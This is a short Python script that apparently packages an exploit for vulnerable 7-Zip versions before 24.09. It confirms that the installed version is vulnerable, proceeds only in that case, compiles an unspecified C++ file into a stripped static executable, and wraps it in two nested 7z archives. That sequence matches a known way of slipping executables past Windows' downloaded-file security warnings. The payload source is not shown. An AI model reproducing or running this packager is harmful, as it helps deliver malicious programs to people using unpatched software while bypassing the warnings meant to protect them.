import os
import subprocess
import re

VULNERABLE_VERSION_THRESHOLD = (24, 9) # 7-Zip versions prior to 24.09 are vulnerable

def get_7zip_version():
    """Check if 7-Zip is installed and return its version."""
    try:
        result = subprocess.run(["7z"], capture_output=True, text=True)
        match = re.search(r"7-Zip (\d+)\.(\d+)", result.stdout)
        if match:
            major, minor = int(match.group(1)), int(match.group(2))
            return major, minor
    except FileNotFoundError:
        print("[!] 7-Zip is not installed or not in PATH.")
        return None
    return None

def check_vulnerability(version):
    """Check if the detected 7-Zip version is vulnerable (prior to 24.09)."""
    return version < VULNERABLE_VERSION_THRESHOLD

def compile_cpp(source_file, output_file):
    """Compile a C++ file into an executable using g++."""
    if not os.path.exists(source_file):
        print(f"[!] Source file '{source_file}' not found.")
        return False
    try:
        subprocess.run(["g++", source_file, "-o", output_file, "-static", "-s"], check=True)
        print(f"[+] Compiled: {output_file}")
        return True
    except subprocess.CalledProcessError as e:
        print(f"[!] Compilation failed: {e}")
        return False

def compress_file(input_file, output_archive):
    """Compress a file using 7-Zip."""
    if not os.path.exists(input_file):
        print(f"[!] File '{input_file}' not found.")
        return False
    try:
        subprocess.run(["7z", "a", output_archive, input_file], check=True)
        print(f"[+] Created: {output_archive}")
        return True
    except subprocess.CalledProcessError as e:
        print(f"[!] Compression failed: {e}")
        return False

def main():
    version = get_7zip_version()
    if not version:
        return

    print(f"[*] Detected 7-Zip version: {version[0]}.{version[1]}")

    if check_vulnerability(version):
        print("[!] Vulnerable 7-Zip version detected!")
        choice = input("[?] Do you want to continue? (y/n): ").strip().lower()
        if choice != 'y':
            print("[*] Exiting.")
            return
    else:
        print("[*] 7-Zip is not vulnerable. Exiting.")
        return

    cpp_file = "executable.cpp"
    exe_file = "compiled.exe"

    if not compile_cpp(cpp_file, exe_file):
        return

    if not compress_file(exe_file, "first_compressed.7z"):
        return

    compress_file("first_compressed.7z", "double_compressed.7z")

if __name__ == "__main__":
    main()